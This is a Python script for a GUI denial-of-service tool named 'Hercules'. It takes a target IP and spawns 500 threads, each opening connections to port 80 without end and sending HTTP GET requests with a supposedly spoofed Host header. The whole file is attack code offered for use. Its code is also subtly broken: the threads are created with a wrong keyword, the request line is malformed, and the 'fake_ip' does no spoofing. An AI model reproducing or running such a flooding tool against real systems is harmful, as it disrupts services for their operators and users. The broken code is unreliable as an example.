import PySimpleGUI as sg
import os
from concurrent.futures import thread
import socket
import threading
import time
sg.theme("Dark Purple")
layout = [[sg.Text("Hercules")],
         [sg.Text("Made by GUARDESK Security LTD.")],
         [sg.Text("Insert target IP:")],
         [sg.InputText()],
         [sg.Submit(), sg.Cancel()]
         ]
window = sg.Window(title="Hercules DoS Tool", layout=layout, margins=(100,150))
url = window.read()[1][0]
port = 80
Trd = 500
fake_ip = '44.197.175.168'
attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((url, port))
        s.sendto(("GET /" + url +"HTTP/1.1\r\n").encode('ascii'), (url, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (url, port))

        global attack_num
        attack_num += 1

        s.close()
for i in range(Trd):
    thread = threading.Thread(url = attack)
    thread.start()    
if __name__ == "__main__":
    sg.Print("Hercules")
    print = sg.Print
    print(attack_num)
    time.sleep(50)
window.close()
